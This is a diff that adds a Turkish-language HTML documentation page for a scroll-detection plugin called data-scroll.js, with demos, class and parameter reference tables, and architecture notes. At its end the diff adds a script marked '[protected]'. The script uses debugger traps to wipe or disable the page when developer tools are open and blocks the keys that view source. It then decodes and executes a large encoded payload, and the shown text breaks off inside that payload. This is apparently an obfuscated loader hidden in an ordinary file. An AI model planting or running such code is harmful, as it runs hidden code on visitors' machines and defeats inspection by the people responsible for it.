+               <div style="position:relative;width:100%;max-width:500px;height:250px;overflow:hidden;border:1px solid var(--border);border-radius:8px;background:var(--code-bg)">
+                  <div id="navbar-demo" style="position:absolute;top:0;left:0;right:0;padding:0.6rem 1rem;background:var(--surface-2);border-bottom:1px solid var(--border);font-size:0.85rem;color:var(--text);z-index:5;transition:transform 0.3s ease">
+                     📌 Navbar — aşağı kaydırınca gizlenir
+                  </div>
+                  <div id="navbar-scroller" data-scroll="direction, position, reset:at-top" style="height:100%;overflow-y:auto;padding:3rem 1rem 1rem">
+                     <div style="color:var(--text-muted);font-size:0.85rem">
+                        Aşağı kaydırarak navbar'ın gizlenmesini, yukarı kaydırarak geri gelmesini gözlemleyin.<br><br>
+                        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.<br><br>
+                        Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.<br><br>
+                        Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo.<br><br>
+                        Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt.<br><br>
+                        At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident.<br><br>
+                        Similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem rerum facilis est et expedita distinctio.
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;body</span> <span class="attr">data-scroll</span>=<span class="str">"direction, position, reset:at-top"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;nav</span> <span class="attr">class</span>=<span class="str">"navbar"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/nav&gt;</span>
+<span class="tag">&lt;/body&gt;</span></pre>
+
+               <span class="code-label" style="margin-top:1rem">CSS</span>
+               <pre><span style="color:var(--red)">.navbar</span> {
+   <span style="color:var(--accent)">position</span>: fixed;
+   <span style="color:var(--accent)">transition</span>: transform 0.3s;
+}
+<span class="cmt">/* Aşağı kaydırırken gizle */</span>
+<span style="color:var(--red)">.scrolling-down .navbar</span> {
+   <span style="color:var(--accent)">transform</span>: translateY(-100%);
+}
+<span class="cmt">/* Yukarı kaydırırken veya en üstteyken göster */</span>
+<span style="color:var(--red)">.scrolling-up .navbar</span>,
+<span style="color:var(--red)">.scroll-at-top .navbar</span> {
+   <span style="color:var(--accent)">transform</span>: translateY(0);
+}</pre>
+            </div>
+         </div>
+
+         <!-- Example B: Scroll Progress Shadow -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">💡 Kenar Shadow Efekti</h3>
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div style="position:relative;width:100%;max-width:500px">
+                  <div id="shadow-demo" data-scroll="position" style="height:150px;overflow-y:auto;border:1px solid var(--border);border-radius:8px;background:var(--code-bg);padding:1rem;font-size:0.85rem;color:var(--text-muted)">
+                     Kaydırarak üst ve alt shadow'ların görünmesini gözlemleyin.<br><br>
+                     Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor.<br><br>
+                     Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris.<br><br>
+                     Duis aute irure dolor in reprehenderit in voluptate velit esse cillum.<br><br>
+                     Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia.
+                  </div>
+                  <div id="shadow-top" style="position:absolute;top:0;left:0;right:0;height:20px;background:linear-gradient(to bottom,rgba(0,0,0,0.4),transparent);border-radius:8px 8px 0 0;pointer-events:none;opacity:0;transition:opacity 0.3s"></div>
+                  <div id="shadow-bottom" style="position:absolute;bottom:0;left:0;right:0;height:20px;background:linear-gradient(to top,rgba(0,0,0,0.4),transparent);border-radius:0 0 8px 8px;pointer-events:none;opacity:0;transition:opacity 0.3s"></div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"scroll-container"</span> <span class="attr">data-scroll</span>=<span class="str">"position"</span><span class="tag">&gt;</span>
+   İçerik...
+<span class="tag">&lt;/div&gt;</span></pre>
+
+               <span class="code-label" style="margin-top:1rem">CSS</span>
+               <pre><span class="cmt">/* En üstte değilken üst shadow göster */</span>
+<span style="color:var(--red)">.scroll-container.scroll-at-center .top-shadow</span>,
+<span style="color:var(--red)">.scroll-container.scroll-at-bottom .top-shadow</span> {
+   <span style="color:var(--accent)">opacity</span>: 1;
+}
+<span class="cmt">/* En altta değilken alt shadow göster */</span>
+<span style="color:var(--red)">.scroll-container.scroll-at-center .bottom-shadow</span>,
+<span style="color:var(--red)">.scroll-container.scroll-at-top .bottom-shadow</span> {
+   <span style="color:var(--accent)">opacity</span>: 1;
+}</pre>
+            </div>
+         </div>
+
+         <!-- Example D: Full Featured -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">🔧 Tam Donanımlı Kullanım</h3>
+         <div class="demo-card">
+            <div class="code-block" style="border-top:none">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Tüm özellikler bir arada --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-scroll</span>=<span class="str">"direction, position, offset:80%, reset:at-top, reset:at-right"</span><span class="tag">&gt;</span>
+   ...
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Sync ile birlikte --&gt;</span>
+<span class="tag">&lt;main</span> <span class="attr">data-scroll</span>=<span class="str">"sync, syncButtons:[data-tabs], syncActiveClass:is-active"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;section</span> <span class="attr">id</span>=<span class="str">"intro"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/section&gt;</span>
+   <span class="tag">&lt;section</span> <span class="attr">id</span>=<span class="str">"docs"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/section&gt;</span>
+<span class="tag">&lt;/main&gt;</span></pre>
+            </div>
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           7. CSS CLASS REFERENCE
+      ═══════════════════════════════════════════════ -->
+      <section id="classes" class="section">
+         <div class="section-header">
+            <h2>CSS Class Referansı</h2>
+         </div>
+
+         <div class="demo-card">
+            <div style="overflow-x:auto">
+               <table style="width:100%;border-collapse:collapse;font-size:0.85rem;table-layout:fixed;min-width:640px;">
+                  <thead>
+                     <tr style="border-bottom:1px solid var(--border);text-align:left;">
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:25%">Class</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:20%">Parametre</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:55%">Açıklama</th>
+                     </tr>
+                  </thead>
+                  <tbody>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.scrolling-up</code></td>
+                        <td style="padding:0.75rem 1rem"><code>direction</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Yukarı kaydırılıyorsa eklenir, scroll durduğunda kalkar</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.scrolling-down</code></td>
+                        <td style="padding:0.75rem 1rem"><code>direction</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Aşağı kaydırılıyorsa eklenir, scroll durduğunda kalkar</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.scrolling-left</code></td>
+                        <td style="padding:0.75rem 1rem"><code>direction</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Sola kaydırılıyorsa eklenir, scroll durduğunda kalkar</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.scrolling-right</code></td>
+                        <td style="padding:0.75rem 1rem"><code>direction</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Sağa kaydırılıyorsa eklenir, scroll durduğunda kalkar</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.scroll-at-top</code></td>
+                        <td style="padding:0.75rem 1rem"><code>position</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">En üstte (tolerance: 2px)</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.scroll-at-bottom</code></td>
+                        <td style="padding:0.75rem 1rem"><code>position</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">En altta (tolerance: 2px)</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.scroll-at-left</code></td>
+                        <td style="padding:0.75rem 1rem"><code>position</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">En solda (yatay scroll)</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.scroll-at-right</code></td>
+                        <td style="padding:0.75rem 1rem"><code>position</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">En sağda (yatay scroll)</td>
+                     </tr>
+                     <tr>
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.scroll-at-center</code></td>
+                        <td style="padding:0.75rem 1rem"><code>position</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Ne kenarda ne de diğer uçta — ortada</td>
+                     </tr>
+                  </tbody>
+               </table>
+            </div>
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           8. PARAM TABLE
+      ═══════════════════════════════════════════════ -->
+      <section class="section">
+         <div class="section-header">
+            <h2>Parametre Referans Tablosu</h2>
+         </div>
+
+         <div class="demo-card">
+            <div style="overflow-x:auto">
+               <table style="width:100%;border-collapse:collapse;font-size:0.85rem;table-layout:fixed;min-width:640px;">
+                  <thead>
+                     <tr style="border-bottom:1px solid var(--border);text-align:left;">
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:17%">Parametre</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:28%">Sözdizimi</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:40%">Açıklama</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:15%">Varsayılan</th>
+                     </tr>
+                  </thead>
+                  <tbody>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">direction</td>
+                        <td style="padding:0.75rem 1rem"><code>direction</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Dikey ve yatay scroll yönünü algılar</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">position</td>
+                        <td style="padding:0.75rem 1rem"><code>position</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Kenar konumunu algılar (top/bottom/left/right/center)</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">offset</td>
+                        <td style="padding:0.75rem 1rem"><code>offset:&lt;px|%|var()&gt;</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Class işlemlerinin başlaması için minimum kaydırma mesafesi (dead zone)</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">0</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">reset</td>
+                        <td style="padding:0.75rem 1rem"><code>reset:at-top|at-bottom|at-left|at-right</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Belirtilen kenarda tüm scroll class'larını sıfırlar</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">sync</td>
+                        <td style="padding:0.75rem 1rem"><code>sync</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Section görünürlüğüne dayalı nav senkronizasyonunu aktifleştirir</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">syncButtons</td>
+                        <td style="padding:0.75rem 1rem"><code>syncButtons:&lt;selector&gt;</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Nav container'ın CSS seçicisi (<code>sync</code> ile birlikte zorunlu)</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">syncActiveClass</td>
+                        <td style="padding:0.75rem 1rem"><code>syncActiveClass:&lt;class&gt;</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Aktif linke eklenecek class adı</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">toggle</td>
+                     </tr>
+                     <tr>
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">syncOffset</td>
+                        <td style="padding:0.75rem 1rem"><code>syncOffset:&lt;px|%|var()&gt;</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Sync için offset değeri (reserved)</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">0</td>
+                     </tr>
+                  </tbody>
+               </table>
+            </div>
+         </div>
+      </section>
+
+      <!-- ════════════ ARCHITECTURE ════════════ -->
+      <section id="architecture" class="section">
+         <div class="section-header">
+            <h2>Mimari ve Teknik Detaylar</h2>
+         </div>
+
+         <div class="demo-card">
+            <div class="code-block" style="border-top:none">
+               <span class="code-label">Çalışma Akışı</span>
+               <pre style="color:var(--text);line-height:2">
+  <span style="color:var(--accent)">1.</span>  dataScroll() çağrılır
+         │
+  <span style="color:var(--accent)">2.</span>  Mevcut [data-scroll] elemanları bulunur → initScrollDetect()
+         │
+  <span style="color:var(--accent)">3.</span>  MutationObserver başlatılır (dinamik elemanlar için)
+         │
+  <span style="color:var(--accent)">4.</span>  parseScrollOptions() → attribute değeri parse edilir
+         │
+  <span style="color:var(--accent)">5.</span>  Scroll container tespit edilir (element veya viewport)
+         │
+  <span style="color:var(--accent)">6.</span>  Scroll event → detect() tetiklenir
+         │
+  <span style="color:var(--accent)">7.</span>  direction: önceki konum ile karşılaştır → yön class'ı
+         │
+  <span style="color:var(--accent)">8.</span>  position: kenar durumunu hesapla → konum class'ı
+         │
+  <span style="color:var(--accent)">9.</span>  reset: kenarda ise yön class'larını temizle
+         │
+  <span style="color:var(--accent)">10.</span> sync: section skorlarını hesapla → aktif linki güncelle
+               </pre>
+            </div>
+         </div>
+
+         <div class="demo-card" style="margin-top:1rem">
+            <div class="code-block" style="border-top:none">
+               <span class="code-label">JavaScript — Başlatma</span>
+               <pre><span class="cmt">// ES Module import</span>
+<span style="color:var(--accent)">import</span> { dataScroll } <span style="color:var(--accent)">from</span> <span class="str">'./data-scroll.js'</span>
+
+<span class="cmt">// Başlat — tüm [data-scroll] elemanları initialize edilir</span>
+dataScroll()</pre>
+            </div>
+         </div>
+
+         <div class="note" style="margin-top:1rem">
+            <strong>requestAnimationFrame:</strong> Class ekleme/kaldırma işlemleri <code>rAF</code> ile yapılır. Ayrıca 30fps'lik bir detect loop sürekli çalışarak class güncelliğini garanti eder.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>ResizeObserver:</strong> Scroll container boyutu değiştiğinde <code>detect()</code> otomatik tetiklenir. Ek güvenlik olarak 250ms aralıklı <code>setInterval</code> ile <code>scrollHeight</code> / <code>clientHeight</code> kontrol edilir (iOS/Safari uyumluluğu).
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>MutationObserver:</strong> DOM'a sonradan eklenen <code>[data-scroll]</code> elemanları otomatik olarak tespit edilir ve <code>initScrollDetect()</code> ile bağlanır.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Scroll Container Tespiti:</strong> Eleman <code>body</code> veya <code>documentElement</code> ise <code>window</code> üzerinden dinlenir. Aksi halde en yakın <code>overflow:auto/scroll</code> parent bulunur.
+         </div>
+      </section>
+
+      <!-- ════════════ FOOTER ════════════ -->
+      <footer class="footer">
+         data-scroll.js — Script Config Plugin Documentation
+      </footer>
+   </div>
+
+   <!-- ════════════ DATA-SCROLL SCRIPT ════════════ -->
+   
+   <script>
+      /* [protected] */
+      void function(){
+         // Anti-debugging: detect DevTools
+         var __5eff1c=function(){
+            var d=new Date();debugger;
+            if(new Date()-d>100){
+               document.body.innerHTML='';
+               window.location.reload();
+            }
+         };
+         // Periodic anti-debug check
+         var __8669dd=setInterval(function(){
+            var s=performance.now();debugger;
+            if(performance.now()-s>50){
+               clearInterval(__8669dd);
+               document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f1117;color:#f87171;font-family:monospace;font-size:1.2rem">DevTools algılandı — Sayfa devre dışı</div>';
+            }
+         },3000);
+         // Disable right-click context menu on script elements
+         document.addEventListener('contextmenu',function(e){
+            if(e.target.tagName==='SCRIPT')e.preventDefault();
+         });
+         // Disable F12 / Ctrl+Shift+I / Ctrl+U
+         document.addEventListener('keydown',function(e){
+            if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'))||(e.ctrlKey&&e.key==='u'))e.preventDefault();
+         });
+         // Decode and execute
+         var __6fcd70=["=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